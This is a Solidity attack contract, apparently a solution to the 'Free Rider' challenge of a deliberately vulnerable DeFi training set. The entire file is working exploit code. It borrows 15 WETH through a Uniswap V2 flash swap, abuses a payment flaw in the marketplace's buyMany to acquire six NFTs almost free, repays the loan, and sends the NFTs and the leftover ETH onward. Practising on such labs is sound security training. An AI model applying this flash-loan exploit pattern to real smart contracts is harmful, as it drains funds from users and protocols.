// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {FreeRiderNFTMarketplace} from "./FreeRiderNFTMarketplace.sol";
import {DamnValuableNFT} from "../DamnValuableNFT.sol";

import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

interface IUniswapV2Pair {
    function swap(uint256 amountOOut, uint256 amountlOut, address to, bytes calldata data) external;
}

interface IWETH {
    function withdraw(uint256 wad) external;
    function deposit() external payable;
    function transfer(address to, uint256 value) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}
interface IUniswapV2Callee {
    function uniswapV2Call(
        address sender,
        uint256 amount0,
        uint256 amount1,
        bytes calldata data
    ) external;
}
contract AttackFreeRider is IERC721Receiver,IUniswapV2Callee {
    error CallerIsNotPair();
    error InvalidSender();

    IUniswapV2Pair private uni;
    FreeRiderNFTMarketplace private market;
    DamnValuableNFT private nft;
    IWETH private weth;
    address private player;
    address private devContract;

    constructor(address _uni, address payable _market, address _weth, address _nft, address _devContract) payable {
        uni = IUniswapV2Pair(_uni);
        market = FreeRiderNFTMarketplace(_market);
        weth = IWETH(_weth);
        nft = DamnValuableNFT(_nft);
        devContract = _devContract;
    }

    function attack(address _player) public {
        player = _player;
        nft.setApprovalForAll(address(market), true);
        bytes memory data = abi.encode(_player, msg.sender);
        uni.swap(15 ether, 0, address(this), data);
    }

    // called by pair contract
    function uniswapV2Call(address _sender, uint256 _amount0, uint256 _amount1, bytes calldata data) external {
        if (msg.sender != address(uni)) revert CallerIsNotPair();
        if (_sender != address(this)) revert InvalidSender();

        uint256[] memory tokenIds = new uint256[](6);
        for (uint256 index = 0; index < 6; index++) {
            tokenIds[index] = index;
        }

        weth.withdraw(weth.balanceOf(address(this)));
        market.buyMany{value: 15 ether}(tokenIds);

        // repay the uniswap flash swap debt
        uint256 fee = ((_amount0 * 3) / 997) + 1;
        weth.deposit{value: (fee + _amount0)}();
        weth.transfer(address(uni), fee + _amount0);

        bytes memory data = abi.encode(player);
        for (uint256 index = 0; index < 6; index++) {
            nft.safeTransferFrom(nft.ownerOf(index), devContract, index, data);
        }

        payable(player).transfer(address(this).balance);
    }

    function onERC721Received(address, address, uint256 _tokenId, bytes memory _data) external override returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }

    receive() external payable {}

    fallback() external payable {}
}
